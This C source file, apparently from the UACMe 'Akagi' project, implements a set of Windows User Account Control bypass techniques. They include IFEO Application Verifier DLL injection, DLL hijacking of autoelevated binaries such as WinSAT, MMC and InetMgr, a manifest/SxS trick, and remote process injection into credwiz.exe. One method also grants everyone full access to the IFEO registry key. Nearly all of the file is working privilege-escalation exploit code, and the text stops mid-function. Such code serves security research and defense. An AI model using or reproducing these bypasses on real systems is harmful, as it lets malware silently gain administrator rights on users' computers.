/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2019
*
*  TITLE:       HYBRIDS.C
*
*  VERSION:     3.19
*
*  DATE:        22 May 2019
*
*  Hybrid UAC bypass methods.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"
#include "makecab.h"
#include "encresource.h"

LOAD_PARAMETERS_SIREFEF g_SirefefLoadParams;

/*
* ucmMethodCleanupSingleFileSystem32
*
* Purpose:
*
* Post execution cleanup routine.
*
* lpItemName length limited to MAX_PATH
*
*/
BOOL ucmMethodCleanupSingleItemSystem32(
    LPWSTR lpItemName
)
{
    WCHAR szBuffer[MAX_PATH * 2];

    _strcpy(szBuffer, g_ctx->szSystemDirectory);
    _strcat(szBuffer, lpItemName);

    return ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
}

/*
* ucmAvrfMethod
*
* Purpose:
*
* Acquire elevation through Application Verifier dll injection.
*
* Fixed in Windows 10 TH1
*
*/
NTSTATUS ucmAvrfMethod(
    _In_ PVOID AvrfDll,
    _In_ DWORD AvrfDllSize
)
{
    BOOL bWusaNeedCleanup = FALSE;
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    HKEY hKey = NULL, hSubKey = NULL;
    LRESULT lRet;
    DWORD dwValue = 0x100; // FLG_APPLICATION_VERIFIER;
    WCHAR szBuffer[MAX_PATH * 2];
    WCHAR szSourceDll[MAX_PATH * 2];

    UNICODE_STRING ustr;
    OBJECT_ATTRIBUTES obja;

    do {

        //
        // Extract file to the protected directory.
        // First, create cab with fake msu ext, second run fusion process.
        //
        RtlSecureZeroMemory(szSourceDll, sizeof(szSourceDll));
        _strcpy(szSourceDll, g_ctx->szTempDirectory);
        _strcat(szSourceDll, HIBIKI_DLL);
        bWusaNeedCleanup = ucmCreateCabinetForSingleFile(szSourceDll, AvrfDll, AvrfDllSize, NULL);
        if (!bWusaNeedCleanup)
            break;

        // Drop Hibiki to system32
        if (!ucmWusaExtractPackage(g_ctx->szSystemDirectory))
            break;

        //
        // Set new key security DACL.
        // Red Alert: manually restore IFEO key permissions after using this tool, as they are not inherited.
        //
        if (!ucmMasqueradedAlterObjectSecurityCOM(
            T_IFEO,
            DACL_SECURITY_INFORMATION,
            SE_REGISTRY_KEY,
            T_SDDL_ALL_FOR_EVERYONE)) break;

        //
        // Open IFEO key.
        //
        RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, L"\\REGISTRY\\");
        _strcat(szBuffer, T_IFEO);
        RtlInitUnicodeString(&ustr, szBuffer);
        InitializeObjectAttributes(&obja, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);

        MethodResult = NtOpenKey((PHANDLE)&hKey, MAXIMUM_ALLOWED, &obja);
        if (!NT_SUCCESS(MethodResult))
            break;

        //
        // Create application key.
        // 
        hSubKey = NULL;
        lRet = RegCreateKey(hKey, CLICONFG_EXE, &hSubKey);
        if ((hSubKey == NULL) || (lRet != ERROR_SUCCESS)) {
            MethodResult = STATUS_ACCESS_DENIED;
            break;
        }

        //
        // Set verifier flag value.
        //
        lRet = RegSetValueEx(hSubKey, T_GLOBAL_FLAG, 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
        if (lRet != ERROR_SUCCESS) {
            MethodResult = STATUS_ACCESS_DENIED;
            break;
        }

        //
        // Set verifier dll value.
        // 
        dwValue = (DWORD)((1 + _strlen(HIBIKI_DLL)) * sizeof(WCHAR));
        lRet = RegSetValueEx(hSubKey, TEXT("VerifierDlls"), 0, REG_SZ, (BYTE*)&HIBIKI_DLL, dwValue);
        if (lRet != ERROR_SUCCESS) {
            MethodResult = STATUS_ACCESS_DENIED;
            break;
        }

        //
        // Cleanup registry, we don't need anymore.
        //
        RegCloseKey(hSubKey);
        hSubKey = NULL;
        NtClose(hKey);
        hKey = NULL;

        //
        // Extract file to the protected directory.
        // First, create cab with fake msu ext, second run fusion process.
        //
        RtlSecureZeroMemory(szSourceDll, sizeof(szSourceDll));
        _strcpy(szSourceDll, g_ctx->szTempDirectory);
        _strcat(szSourceDll, HIBIKI_DLL);
        if (ucmCreateCabinetForSingleFile(szSourceDll, AvrfDll, AvrfDllSize, NULL)) {

            // Drop Hibiki to system32
            if (ucmWusaExtractPackage(g_ctx->szSystemDirectory)) {
                // Finally run target fusion process.
                RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
                _strcpy(szBuffer, g_ctx->szSystemDirectory);
                _strcat(szBuffer, CLICONFG_EXE);
                if (supRunProcess(szBuffer, NULL))
                    MethodResult = STATUS_SUCCESS;
            }
            ucmWusaCabinetCleanup();
        }

    } while (FALSE);

    if (hKey != NULL) {
        NtClose(hKey);
    }
    if (hSubKey != NULL) {
        RegCloseKey(hSubKey);
    }
    if (bWusaNeedCleanup) {
        ucmWusaCabinetCleanup();
    }
    return MethodResult;
}

/*
* ucmWinSATMethod
*
* Purpose:
*
* Acquire elevation through abusing APPINFO.DLL whitelisting model logic and wusa installer/IFileOperation autoelevation.
* Slightly modified target and proxydll can work almost with every autoelevated/whitelisted application.
* This method uses advantage of wusa to write to the protected folders, but can be adapted to IFileOperation too.
* WinSAT used for demonstration purposes only.
*
* Fixed in Windows 10 TH2 (complete vector)
*
*/
NTSTATUS ucmWinSATMethod(
    _In_ LPWSTR lpTargetDll,
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize,
    _In_ BOOL UseWusa
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    BOOL bCopyResult = FALSE;
    CABDATA *Cabinet = NULL;
    WCHAR szSource[MAX_PATH * 2];
    WCHAR szDest[MAX_PATH * 2];
    WCHAR szBuffer[MAX_PATH * 2];

    if (_strlen(lpTargetDll) > 100) {
        return STATUS_INVALID_PARAMETER_1;
    }

    RtlSecureZeroMemory(szSource, sizeof(szSource));
    RtlSecureZeroMemory(szDest, sizeof(szDest));

    do {

        _strcpy(szSource, g_ctx->szSystemDirectory);
        _strcat(szSource, WINSAT_EXE);

        _strcpy(szDest, g_ctx->szTempDirectory);
        _strcat(szDest, WINSAT_EXE);

        // Copy winsat to temp directory
        if (!CopyFile(szSource, szDest, FALSE)) {
            break;
        }

        //put target dll
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx->szTempDirectory);
        _strcat(szSource, lpTargetDll);

        //write proxy dll to disk
        if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
            break;
        }

        //
        // Two options: use wusa installer or IFileOperation
        //
        if (UseWusa) {

            //build cabinet
            _strcpy(szBuffer, g_ctx->szTempDirectory);
            _strcat(szBuffer, ELLOCNAK_MSU);

            Cabinet = cabCreate(szBuffer);
            if (Cabinet) {

                _strcpy(szDest, g_ctx->szTempDirectory);
                _strcat(szDest, WINSAT_EXE);

                //put proxy dll inside cabinet
                cabAddFile(Cabinet, szSource, lpTargetDll);

                //put winsat.exe
                cabAddFile(Cabinet, szDest, WINSAT_EXE);
                cabClose(Cabinet);
            }
            else {
                break;
            }

            //extract package
            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
            _strcpy(szBuffer, g_ctx->szSystemDirectory);
            _strcat(szBuffer, SYSPREP_DIR);
            bCopyResult = ucmWusaExtractPackage(szBuffer);
        }
        else {

            //wusa extract banned, switch to IFileOperation.
            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
            _strcpy(szBuffer, g_ctx->szSystemDirectory);
            _strcat(szBuffer, SYSPREP_DIR);

            if (ucmMasqueradedMoveFileCOM(szSource, szBuffer)) {
                bCopyResult = ucmMasqueradedMoveFileCOM(szDest, szBuffer);
            }
        }

    } while (FALSE);

    if (bCopyResult) {

        //run winsat
        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, g_ctx->szSystemDirectory);
        _strcat(szBuffer, SYSPREP_DIR);
        _strcat(szBuffer, WINSAT_EXE);

        if (supRunProcess(szBuffer, NULL))
            MethodResult = STATUS_SUCCESS;
    }

    //remove trash from %temp%
    if (szDest[0] != 0) {
        DeleteFileW(szDest);
    }
    if (szSource[0] != 0) {
        DeleteFileW(szSource);
    }

    return MethodResult;
}

/*
* ucmMMCMethodCleanup
*
* Purpose:
*
* Post execution cleanup routine for MMCMethod(s).
*
*/
BOOL ucmMMCMethodCleanup(
    _In_ UCM_METHOD Method
)
{
    WCHAR szBuffer[MAX_PATH * 2];

    _strcpy(szBuffer, g_ctx->szSystemDirectory);

    switch (Method) {

    case UacMethodMMC1:
        _strcat(szBuffer, ELSEXT_DLL);
        break;

    case UacMethodMMC2:
        _strcat(szBuffer, WBEM_DIR);
        _strcat(szBuffer, WBEMCOMN_DLL);
        break;

    default:
        return FALSE;
        break;
    }

    return ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
}

/*
* ucmMMCMethod
*
* Purpose:
*
* Bypass UAC by abusing MMC.exe backdoor hardcoded in appinfo.dll
*
*/
NTSTATUS ucmMMCMethod(
    _In_ UCM_METHOD Method,
    _In_ LPWSTR lpTargetDll,
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    LPWSTR lpMscFile = NULL;
    WCHAR szSource[MAX_PATH * 2];
    WCHAR szDest[MAX_PATH * 2];

    if (_strlen(lpTargetDll) > 100) {
        return STATUS_INVALID_PARAMETER_2;
    }

    do {

        //check if file exists (like on srv for example)
        RtlSecureZeroMemory(szDest, sizeof(szDest));
        _strcpy(szDest, g_ctx->szSystemDirectory);

        switch (Method) {
        case UacMethodMMC2:
            _strcat(szDest, WBEM_DIR);
            break;
        default:
            break;
        }

        _strcat(szDest, lpTargetDll);

        if (PathFileExists(szDest))
            break;

        //target dir
        RtlSecureZeroMemory(szDest, sizeof(szDest));
        _strcpy(szDest, g_ctx->szSystemDirectory);

        switch (Method) {

        case UacMethodMMC2:
            _strcat(szDest, WBEM_DIR);
            lpMscFile = RSOP_MSC;
            break;

        default:
            lpMscFile = EVENTVWR_MSC;
            break;
        }

        //put target dll
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx->szTempDirectory);
        _strcat(szSource, lpTargetDll);

        //write proxy dll to disk
        if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
            break;
        }

        //move proxy dll to target directory
        if (!ucmMasqueradedMoveFileCOM(szSource, szDest)) {
            break;
        }

        //run mmc console
        //because of mmc harcoded backdoor uac will autoelevate mmc with valid and trusted MS command.
        //yuubari identified multiple exploits in msc commands loading scheme.
        if (supRunProcess(MMC_EXE, lpMscFile))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    return MethodResult;
}

/*
* ucmSirefefMethodCleanup
*
* Purpose:
*
* Post execution cleanup routine for SirefefMethod.
*
*/
BOOL ucmSirefefMethodCleanup(
    VOID
)
{
    BOOL bResult1, bResult2;
    WCHAR szBuffer[MAX_PATH * 2];

    _strcpy(szBuffer, g_ctx->szSystemDirectory);
    _strcat(szBuffer, WBEM_DIR);
    _strcat(szBuffer, OOBE_EXE);

    bResult1 = ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);

    _strcpy(szBuffer, g_ctx->szSystemDirectory);
    _strcat(szBuffer, WBEM_DIR);
    _strcat(szBuffer, NETUTILS_DLL);

    bResult2 = ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);

    return ((bResult1 != FALSE) && (bResult2 != FALSE));
}

/*
* ucmxElevatedLaunchProc
*
* Purpose:
*
* Elevation procedure used by Sirefef method
*
*/
DWORD WINAPI ucmxElevatedLaunchProc(
    _In_ LOAD_PARAMETERS_SIREFEF *Params
)
{
    SHELLEXECUTEINFOW shexec;

    shexec.cbSize = sizeof(shexec);
    shexec.fMask = SEE_MASK_NOCLOSEPROCESS;
    shexec.nShow = SW_SHOW;
    shexec.lpVerb = Params->szVerb;
    shexec.lpFile = Params->szTargetApp;
    shexec.lpParameters = NULL;
    shexec.lpDirectory = NULL;
    if (Params->ShellExecuteExW(&shexec))
        if (shexec.hProcess != NULL) {
            Params->WaitForSingleObject(shexec.hProcess, INFINITE);
            Params->CloseHandle(shexec.hProcess);
        }

    return Params->RtlExitUserThread(STATUS_SUCCESS);
}

/*
* ucmSirefefMethod
*
* Purpose:
*
* Bypass UAC by abusing OOBE.exe backdoor hardcoded in appinfo.dll
*
* Simplified, original Sirefef code do all copy operations from zombified process.
*
* Fixed in Windows 10 TH2
*
*/
NTSTATUS ucmSirefefMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS                  MethodResult = STATUS_ACCESS_DENIED, Status;
    SIZE_T                    memIO;

    HANDLE                    hProcess = NULL, hRemoteThread = NULL;

    HINSTANCE                 InjectorImageBase = g_hInstance;
    PIMAGE_NT_HEADERS         NtHeaders = RtlImageNtHeader(InjectorImageBase);
    LPVOID                    RemoteCode = NULL, newEp, newDp;
    PLOAD_PARAMETERS_SIREFEF  LoadParams = &g_SirefefLoadParams;
    PVOID                     LoadProc = ucmxElevatedLaunchProc;

    WCHAR                     szB1[MAX_PATH * 2];
    WCHAR                     szB2[MAX_PATH * 2];

    do {

        //
        // Drop Fubuki to the %temp% as NetUtils.dll
        //
        _strcpy(szB1, g_ctx->szTempDirectory);
        _strcat(szB1, NETUTILS_DLL);
        if (!supWriteBufferToFile(szB1, ProxyDll, ProxyDllSize))
            break;

        //
        // Move %temp%\NetUtils.dll to %SystemRoot%\System32\Wbem
        //
        _strcpy(szB2, g_ctx->szSystemDirectory);
        _strcat(szB2, WBEM_DIR);
        if (!ucmMasqueradedMoveFileCOM(szB1, szB2))
            break;

        //
        // Copy %SystemRoot%\system32\credwiz.exe to %temp\oobe.exe
        //
        _strcpy(szB1, g_ctx->szSystemDirectory);
        _strcat(szB1, CREDWIZ_EXE);

        _strcpy(szB2, g_ctx->szTempDirectory);
        _strcat(szB2, OOBE_EXE);

        if (!CopyFile(szB1, szB2, FALSE))
            break;

        //
        // Move %temp%\oobe.exe to %SystemRoot%\system32\wbem
        //      
        _strcpy(szB1, g_ctx->szSystemDirectory);
        _strcat(szB1, WBEM_DIR);
        if (!ucmMasqueradedMoveFileCOM(szB2, szB1))
            break;

        //
        // Prepare shellcode params.
        //
        RtlSecureZeroMemory(LoadParams, sizeof(LOAD_PARAMETERS_SIREFEF));

        _strcpy(LoadParams->szVerb, RUNAS_VERB);

        _strcat(szB1, OOBE_EXE);
        _strncpy(LoadParams->szTargetApp, MAX_PATH, szB1, MAX_PATH);

        LoadParams->ShellExecuteExW = (pfnShellExecuteExW)GetProcAddress(
            g_ctx->hShell32,
            "ShellExecuteExW");

        LoadParams->WaitForSingleObject = (pfnWaitForSingleObject)GetProcAddress(
            g_ctx->hKernel32,
            "WaitForSingleObject");

        LoadParams->CloseHandle = (pfnCloseHandle)GetProcAddress(
            g_ctx->hKernel32,
            "CloseHandle");

        LoadParams->RtlExitUserThread = (pfnRtlExitUserThread)GetProcAddress(
            g_ctx->hNtdll,
            "RtlExitUserThread");

        //
        // Run host process.
        //
        _strcpy(szB1, g_ctx->szSystemDirectory);
        _strcat(szB1, CREDWIZ_EXE);

        hProcess = supRunProcessEx(szB1, NULL, NULL, NULL);
        if (hProcess == NULL)
            break;

        //
        // Inject load code.
        //
        memIO = NtHeaders->OptionalHeader.SizeOfImage;

        Status = NtAllocateVirtualMemory(
            hProcess,
            &RemoteCode,
            0,
            &memIO,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);

        if (!NT_SUCCESS(Status)) {
            MethodResult = Status;
            break;
        }

        if (RemoteCode == NULL) {
            MethodResult = STATUS_INTERNAL_ERROR;
            break;
        }

        memIO = NtHeaders->OptionalHeader.SizeOfImage;

        Status = NtWriteVirtualMemory(
            hProcess,
            RemoteCode,
            InjectorImageBase,
            memIO,
            &memIO);

        if (!NT_SUCCESS(Status)) {
            MethodResult = Status;
            break;
        }

        newEp = (char *)RemoteCode + ((char *)LoadProc - (char *)InjectorImageBase);
        newDp = (char *)RemoteCode + ((char *)LoadParams - (char *)InjectorImageBase);

        Status = RtlCreateUserThread(
            hProcess,
            NULL,
            FALSE,
            0,
            0,
            0,
            (PUSER_THREAD_START_ROUTINE)newEp,
            newDp,
            &hRemoteThread,
            NULL);

        if (!NT_SUCCESS(Status))
        {
            MethodResult = Status;
            break;
        }

        if (hRemoteThread != NULL) {
            WaitForSingleObject(hRemoteThread, INFINITE);
            NtClose(hRemoteThread);
            MethodResult = STATUS_SUCCESS;
        }

    } while (FALSE);

    //
    // Cleanup (system32\wbem data must be removed by payload code).
    //
    if (hProcess) {
        TerminateProcess(hProcess, 0);
        CloseHandle(hProcess);
    }

    _strcpy(szB1, g_ctx->szTempDirectory);
    _strcat(szB1, NETUTILS_DLL);
    DeleteFile(szB1);

    _strcpy(szB1, g_ctx->szTempDirectory);
    _strcat(szB1, OOBE_EXE);
    DeleteFile(szB1);

    return MethodResult;
}

/*
* ucmGenericAutoelevation
*
* Purpose:
*
* Bypass UAC by abusing target autoelevated system32 application via missing system32 dll
*
*/
NTSTATUS ucmGenericAutoelevation(
    _In_ LPWSTR lpTargetApp,
    _In_ LPWSTR lpTargetDll,
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    WCHAR szSource[MAX_PATH * 2];
    WCHAR szDest[MAX_PATH * 2];

    if (_strlen(lpTargetDll) > 100) {
        return STATUS_INVALID_PARAMETER_2;
    }

    //put target dll
    RtlSecureZeroMemory(szSource, sizeof(szSource));
    _strcpy(szSource, g_ctx->szTempDirectory);
    _strcat(szSource, lpTargetDll);

    //write proxy dll to disk
    if (supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {

        //target dir
        RtlSecureZeroMemory(szDest, sizeof(szDest));
        _strcpy(szDest, g_ctx->szSystemDirectory);

        //drop payload to system32
        if (ucmMasqueradedMoveFileCOM(szSource, szDest)) {

            //run target app
            if (supRunProcess(lpTargetApp, NULL))
                MethodResult = STATUS_SUCCESS;
        }
    }

    return MethodResult;
}

/*
* ucmGWX
*
* Purpose:
*
* Bypass UAC by abusing newly added appinfo.dll backdoor.
* IIS initially not installed in Windows client, but appinfo.dll whitelists IIS application as autoelevated.
* We will use backdoor from "Get Windows 10" bullshit marketing promo package and exploit it with dll hijacking as usual.
*
* Since this method very out-dated (GWX program expired long time ago) starting from 2.5.6 Kongou module removed from program resources.
* To use it again place KongouXX.cd to the program directory, where XX is platform (32 or 64).
* Kongou located in project "bin" directory in encrypted and compressed state, Akagi will load, decrypt and decompress it.
*
* Fixed in Windows 10 RS1
*
*/
NTSTATUS ucmGWX(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;

    WCHAR  szDest[MAX_PATH * 2];
    WCHAR  szSource[MAX_PATH * 2];
    WCHAR  szTargetApp[MAX_PATH * 2];

    PVOID Data = NULL, Ptr = NULL;
    ULONG DecompressedBufferSize = 0, DataSize = 0;

    do {

        //target dir
        RtlSecureZeroMemory(szDest, sizeof(szDest));
        _strcpy(szDest, g_ctx->szSystemDirectory);
        _strcat(szDest, INETSRV_DIR);
        _strcat(szDest, INETMGR_EXE);

        //File already exist, so IIS could be installed
        if (PathFileExists(szDest)) {
#ifdef _DEBUG
            supDebugPrint(TEXT("ucmGWX"), ERROR_FILE_EXISTS);
#endif
            MethodResult = STATUS_OBJECT_NAME_EXISTS;
            break;
        }

        //summon some unicorns, kongouXX.cd expected to be in the same directory as application
        Ptr = supReadFileToBuffer(KONGOU_CD, &DataSize);
        if (Ptr == NULL) {
#ifdef _DEBUG
            supDebugPrint(TEXT("ucmGWX"), ERROR_FILE_NOT_FOUND);
#endif
            MethodResult = STATUS_OBJECT_NAME_NOT_FOUND;
            break;
        }

        Data = g_ctx->DecompressRoutine(KONGOU_ID, Ptr, DataSize, &DecompressedBufferSize);
        if (Data == NULL)
            break;

        //write proxy dll to disk
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx->szTempDirectory);
        _strcat(szSource, SLC_DLL);
        if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize))
            break;

        //drop fubuki to system32\inetsrv
        RtlSecureZeroMemory(szDest, sizeof(szDest));
        _strcpy(szDest, g_ctx->szSystemDirectory);
        _strcat(szDest, INETSRV_DIR);
        if (!ucmMasqueradedMoveFileCOM(szSource, szDest)) {
            break;
        }

        //put target app
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx->szTempDirectory);
        _strcat(szSource, INETMGR_EXE);

        //write app to disk
        if (!supWriteBufferToFile(szSource, Data, DecompressedBufferSize)) {
            break;
        }

        //drop InetMgr.exe to system32\inetsrv
        if (!ucmMasqueradedMoveFileCOM(szSource, szDest)) {
            break;
        }

        _strcpy(szTargetApp, szDest);
        _strcat(szTargetApp, INETMGR_EXE);
        if (supRunProcess(szTargetApp, NULL))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    if (Data != NULL) {
        RtlSecureZeroMemory(Data, DecompressedBufferSize);
        supVirtualFree(Data, NULL);
    }

    if (Ptr != NULL) {
        supVirtualFree(Ptr, NULL);
    }
    return MethodResult;
}

/*
* ucmxAutoElevateManifestDropDll
*
* Purpose:
*
* Drop target dll for ucmAutoElevateManifest.
*
*/
BOOL ucmxAutoElevateManifestDropDll(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    WCHAR szDest[MAX_PATH * 2];
    WCHAR szSource[MAX_PATH * 2];

    RtlSecureZeroMemory(szSource, sizeof(szSource));
    _strcpy(szSource, g_ctx->szTempDirectory);
    _strcat(szSource, CRYPTBASE_DLL);
    if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
        return FALSE;
    }
    RtlSecureZeroMemory(szDest, sizeof(szDest));
    _strcpy(szDest, g_ctx->szSystemDirectory);
    _strcat(szDest, SYSPREP_DIR);
    return ucmMasqueradedMoveFileCOM(szSource, szDest);
}

/*
* ucmAutoElevateManifestW7
*
* Purpose:
*
* Special case for Windows 7.
*
*/
NTSTATUS ucmAutoElevateManifestW7(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;

    WCHAR szDest[MAX_PATH * 2];
    WCHAR szSource[MAX_PATH * 2];
    LPWSTR lpApplication = NULL;

    do {

        RtlSecureZeroMemory(szSource, sizeof(szSource));
        RtlSecureZeroMemory(szDest, sizeof(szDest));

        _strcpy(szSource, g_ctx->szSystemDirectory);
        _strcpy(szDest, g_ctx->szTempDirectory);

        lpApplication = TASKHOST_EXE;//doesn't really matter, Yuubari module lists multiple targets
        _strcat(szSource, lpApplication);
        _strcat(szDest, lpApplication);

        // Copy target to temp directory
        if (!CopyFile(szSource, szDest, FALSE))
            break;

        _strcpy(szSource, szDest);

        // Copy target app to windir
        RtlSecureZeroMemory(szDest, sizeof(szDest));
        _strcpy(szDest, USER_SHARED_DATA->NtSystemRoot);
        _strcat(szDest, TEXT("\\"));
        if (!ucmMasqueradedMoveFileCOM(szSource, szDest)) {
            break;
        }

        if (!ucmxAutoElevateManifestDropDll(ProxyDll, ProxyDllSize)) {
            break;
        }

        //put target manifest
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx->szTempDirectory);
        _strcat(szSource, lpApplication);
        _strcat(szSource, MANIFEST_EXT);

        if (!supDecodeAndWriteBufferToFile(szSource,
            (CONST PVOID)&g_encodedManifestData,
            sizeof(g_encodedManifestData),
            AKAGI_XOR_KEY2))
        {
            break;
        }

        RtlSecureZeroMemory(szDest, sizeof(szDest));
        _strcpy(szDest, USER_SHARED_DATA->NtSystemRoot);
        if (!ucmMasqueradedMoveFileCOM(szSource, szDest)) {
            break;
        }

        _strcat(szDest, L"\\");
        _strcat(szDest, lpApplication);
        if (supRunProcess(szDest, NULL))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    return MethodResult;
}

/*
* ucmAutoElevateManifest
*
* Purpose:
*
* Bypass UAC by abusing appinfo whitelist and SXS undocumented feature.
* Ironically revealed by Microsoft itself in their attempt to fix UAC exploit.
* Supported at Windows 7 minimum (older versions not checked).
*
* Fixed in Windows 10 RS1
*
*/
NTSTATUS ucmAutoElevateManifest(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;

    WCHAR szDest[MAX_PATH * 2];
    WCHAR szSource[MAX_PATH * 2];
    LPWSTR lpApplication = NULL;

    do {

        if (g_ctx->dwBuildNumber < 9600) {
            return ucmAutoElevateManifestW7(ProxyDll, ProxyDllSize);
        }

        RtlSecureZeroMemory(szSource, sizeof(szSource));
        RtlSecureZeroMemory(szDest, sizeof(szDest));

        _strcpy(szSource, g_ctx->szSystemDirectory);
        _strcpy(szDest, g_ctx->szTempDirectory);
        _strcat(szSource, TZSYNC_EXE); //doesn't really matter, Yuubari module lists multiple targets
        lpApplication = MIGWIZ_EXE;
        _strcat(szDest, lpApplication);

        // Copy target to temp directory
        if (!CopyFile(szSource, szDest, FALSE))
            break;

        _strcpy(szSource, szDest);

        // Copy target app to home
        RtlSecureZeroMemory(szDest, sizeof(szDest));
        _strcpy(szDest, g_ctx->szSystemDirectory);
        if (!ucmMasqueradedMoveFileCOM(szSource, szDest)) {
            break;
        }

        if (!ucmxAutoElevateManifestDropDll(ProxyDll, ProxyDllSize)) {
            break;
        }

        //put target manifest
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        _strcpy(szSource, g_ctx->szTempDirectory);
        _strcat(szSource, lpApplication);
        _strcat(szSource, MANIFEST_EXT);

        if (!supDecodeAndWriteBufferToFile(szSource,
            (CONST PVOID)&g_encodedManifestData,
            sizeof(g_encodedManifestData),
            AKAGI_XOR_KEY2))
        {
            break;
        }

        RtlSecureZeroMemory(szDest, sizeof(szDest));
        _strcpy(szDest, g_ctx->szSystemDirectory);
        if (!ucmMasqueradedMoveFileCOM(szSource, szDest)) {
            break;
        }

        _strcpy(szDest, g_ctx->szSystemDirectory);
        _strcat(szDest, lpApplication);
        if (supRunProcess(szDest, NULL))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    return MethodResult;
}

/*
* ucmInetMgrFindCallback
*
* Purpose:
*
* File search callback which does all the magic.
*
*/
BOOL ucmInetMgrFindCallback(
    _In_ WIN32_FIND_DATA *fdata,
    _In_ LPWSTR lpDirectory,
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    BOOL            bCond = FALSE, bSuccess = FALSE;
    SIZE_T          l = 0;
    HANDLE          hFile = INVALID_HANDLE_VALUE, hFileMapping = NULL;
    PDWORD          MappedFile = NULL;
    LARGE_INTEGER   FileSize;
    CFILE_TYPE      ft;

    PVOID           OutputBuffer = NULL;
    SIZE_T          OutputBufferSize = 0;

    WCHAR textbuf[MAX_PATH * 4];
    WCHAR szDest[MAX_PATH * 2];

    if (lpDirectory == NULL)
        return FALSE;

    do {
        if (fdata->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            break;

        if (_strcmpi(fdata->cFileName, INETMGR_EXE) != 0)
            break;

        RtlSecureZeroMemory(&textbuf, sizeof(textbuf));
        _strcpy(textbuf, lpDirectory);

        l = _strlen(textbuf);
        if (textbuf[l - 1] != L'\\') {
            textbuf[l] = L'\\';
            textbuf[l + 1] = 0;
        }
        _strcat(textbuf, fdata->cFileName);

        hFile = CreateFile(textbuf, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE)
            break;

        FileSize.QuadPart = 0;
        if (!GetFileSizeEx(hFile, &FileSize))
            break;

        if (FileSize.QuadPart < 8)
            break;

        hFileMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
        if (hFileMapping == NULL)
            break;

        MappedFile = (PDWORD)MapViewOfFile(hFileMapping, PAGE_READWRITE, 0, 0, 0);
        if (MappedFile == NULL)
            break;

        ft = GetTargetFileType(MappedFile);
        if (ft == ftUnknown)
            break;

        switch (ft) {

        case ftMZ: //win7            
            bSuccess = ProcessFileMZ(MappedFile, (SIZE_T)FileSize.LowPart, &OutputBuffer, &OutputBufferSize);
            break;

        case ftDCN://win8     
            bSuccess = ProcessFileDCN(MappedFile, (SIZE_T)FileSize.LowPart, &OutputBuffer, &OutputBufferSize);
            break;

        case ftDCS://win10   

            if (InitCabinetDecompressionAPI()) {
                bSuccess = ProcessFileDCS(MappedFile, (SIZE_T)FileSize.LowPart, &OutputBuffer, &OutputBufferSize);
            }
            break;

        default:
            break;

        }

        //is there any error processing files from winsxs?
        if (!bSuccess)
            break;

        RtlSecureZeroMemory(&textbuf, sizeof(textbuf));
        _strcpy(textbuf, g_ctx->szTempDirectory);
        _strcat(textbuf, INETMGR_EXE);

        bSuccess = supWriteBufferToFile(textbuf, OutputBuffer, (DWORD)OutputBufferSize);
        if (!bSuccess)
            break;

        RtlSecureZeroMemory(&szDest, sizeof(szDest));
        _strcpy(szDest, g_ctx->szSystemDirectory);
        _strcat(szDest, INETSRV_DIR);
        bSuccess = ucmMasqueradedMoveFileCOM(textbuf, szDest);
        if (!bSuccess)
